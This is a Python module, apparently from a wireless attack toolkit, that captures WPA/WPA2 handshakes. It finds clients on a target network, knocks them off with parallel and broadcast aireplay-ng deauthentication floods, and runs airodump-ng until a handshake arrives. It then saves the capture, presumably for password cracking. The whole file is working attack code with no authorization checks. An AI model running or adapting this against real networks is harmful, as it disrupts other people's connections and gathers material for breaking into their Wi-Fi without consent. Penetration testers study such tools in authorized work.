"""
Handshake capture — deauthenticate connected clients and capture
the WPA/WPA2 4-way handshake using airodump-ng.

Parallel deauth threads + broadcast follow handshakeCracker's pattern.
"""

import os
import time
import signal
import shutil
import threading
import subprocess
from datetime import datetime

from src.console import console, colored_log, log_error, log_debug
from src.utils import execute_command, sanitize_ssid
from src.scanner import detect_connected_clients
from src.config import HANDSHAKES_DIR, DEAUTH_COUNT, CAPTURE_TIMEOUT
from rich.table import Table
from rich.panel import Panel


def capture_handshake(self, network) -> str | None:
    """
    Capture a WPA/WPA2 handshake from *network*.

    Steps:
      1. Detect connected clients (15-second scan).
      2. Deauthenticate all detected clients (parallel + broadcast).
      3. Run airodump-ng and wait for a valid handshake (up to 60 seconds).

    Returns the path to the saved .cap file, or None on failure.
    """
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface!")
        return None

    # ── 1. Client detection ──────────────────────────────────────
    clients = detect_connected_clients(self, network)
    if not clients:
        colored_log("error", f"No connected clients detected for {network.essid}.")
        return None

    client_table = Table(show_header=True, header_style="bold cyan", box=None)
    client_table.add_column("#", style="bold", width=3)
    client_table.add_column("Client MAC", style="green")
    for idx, mac in enumerate(clients, 1):
        client_table.add_row(str(idx), mac)

    console.print(Panel(
        client_table,
        title=f"[bold green][+] {len(clients)} Client(s) Detected[/bold green]",
        border_style="green",
    ))

    # ── 2. Deauthentication ───────────────────────────────────────
    _deauthenticate_all(self, network, clients)

    # ── 3. Capture ────────────────────────────────────────────────
    safe_essid = sanitize_ssid(network.essid)
    ts = datetime.now().strftime("%Y%m%d-%H%M%S")
    capture_prefix = os.path.join(self.temp_dir, f"{safe_essid}_{ts}")

    colored_log("info", f"Starting handshake capture for {network.essid}...")

    try:
        capture_proc = subprocess.Popen(
            [
                "airodump-ng", "--bssid", network.bssid,
                "--channel", str(network.channel),
                "--write", capture_prefix,
                self.monitor_interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        colored_log("error", "airodump-ng not found — install aircrack-ng suite!")
        return None

    cap_file = f"{capture_prefix}-01.cap"
    timeout = CAPTURE_TIMEOUT
    start = time.time()

    console.print(f"\n[bold cyan][*] Capturing handshake for {network.essid}...[/bold cyan]")
    handshake_found = False

    try:
        while True:
            elapsed = int(time.time() - start)
            remaining = max(0, timeout - elapsed)
            progress = int((elapsed / timeout) * 30)
            bar = f"[{'=' * progress}{'-' * (30 - progress)}]"
            console.print(f"[cyan][TIME] {elapsed}s / {timeout}s {bar}[/cyan]", end="\r")

            if os.path.exists(cap_file) and _check_handshake_fast(cap_file):
                console.print(" " * 80, end="\r")
                console.print("[bold green][+] Handshake detected![/bold green]")
                handshake_found = True
                break

            if elapsed >= timeout:
                console.print(" " * 80, end="\r")
                colored_log("warning", "Capture timed out after 1 minute.")
                break
            time.sleep(1)
    except KeyboardInterrupt:
        console.print(" " * 80, end="\r")
        colored_log("warning", "Capture cancelled by user.")
    finally:
        capture_proc.send_signal(signal.SIGTERM)
        capture_proc.wait()

    if not handshake_found or not os.path.exists(cap_file):
        colored_log("error", "Failed to capture handshake!")
        return None

    final_path = os.path.join(HANDSHAKES_DIR, f"{safe_essid}.cap")
    os.makedirs(HANDSHAKES_DIR, exist_ok=True)
    shutil.copy(cap_file, final_path)
    colored_log("success", f"Handshake saved to {final_path}")
    return final_path


# ── Internal helpers ────────────────────────────────────────────────────

def _check_handshake_fast(cap_file: str) -> bool:
    """Quick check whether *cap_file* contains a valid handshake (via aircrack-ng)."""
    result = execute_command(["aircrack-ng", cap_file])
    return bool(result and "1 handshake" in result.stdout)


def _deauthenticate_all(self, network, clients: list[str]):
    """
    Deauthenticate every detected client in parallel, plus a broadcast.

    Uses threading so all deauth packets are sent almost simultaneously.
    """
    colored_log("info", f"Deauthenticating {len(clients)} client(s) on {network.essid}...")

    def _deauth_one(client: str):
        try:
            subprocess.Popen(
                [
                    "aireplay-ng", "--deauth", str(DEAUTH_COUNT),
                    "-a", network.bssid, "-c", client,
                    self.monitor_interface,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            log_error("aireplay-ng not available for deauth.")

    threads = []
    for idx, client in enumerate(clients, 1):
        colored_log("info", f"[{idx}/{len(clients)}] Deauth -> {client}")
        t = threading.Thread(target=_deauth_one, args=(client,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.1)

    time.sleep(1)

    # Broadcast deauth
    colored_log("info", "Sending broadcast deauthentication...")
    try:
        subprocess.Popen(
            [
                "aireplay-ng", "--deauth", str(DEAUTH_COUNT),
                "-a", network.bssid,
                self.monitor_interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        log_error("aireplay-ng not available for broadcast deauth.")

    time.sleep(3)
    colored_log("success", "Deauthentication complete — listening for handshake...")
